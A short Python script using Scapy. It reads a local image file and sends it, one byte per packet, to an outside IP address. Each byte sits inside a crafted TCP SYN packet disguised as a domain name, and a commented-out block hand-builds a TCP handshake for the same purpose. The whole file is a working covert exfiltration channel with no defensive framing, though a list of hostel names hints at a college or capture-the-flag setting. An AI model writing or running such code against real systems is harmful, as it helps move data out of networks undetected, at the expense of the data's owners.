
from scapy.all import *
import time
import random

# VARIABLES
src = "192.168.43.179"
dst = "65.1.89.200"
sport = random.randint(1024,65535)
dport = 1234


# DNS
data=open('final/2.jpg','rb').read()

# TCP
p=IP(dst='65.1.89.200',id=1337,ttl=99)/TCP(sport=RandShort(),dport=[80],seq=12345,ack=1000,window=1000,flags="S")/"hacker"
for i in range(len(data)):
	id=random.randint(1, 2**16)
	
	p.load=f'{data[i]}.iitism.ac.in'
	p.id=id
	send(p)

	if i%100==0: open("log.txt",'a+').write(f"reached packet {i}\n")

#hostels=['diamond','topaz','jasper','ruby','rosaline','sapphire','emarald','amber','opal']
#SYN
'''
for i in data[:100]:
	ip=IP(src=src,dst=dst)
	SYN=TCP(sport=sport,dport=dport,flags='S',seq=1000)
	SYNACK=sr1(ip/SYN)

	# ACK
	ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
	send(ip/ACK)

	#time.sleep(15)

	ip = IP(src=src, dst=dst)
	tcp = ip / TCP(sport=sport, dport=dport, flags="PA", seq=123, ack=1) / f"{hex(i)[2:].zfill(2)}scapy packet 123"
	#tcp.show2()

	send(tcp)'''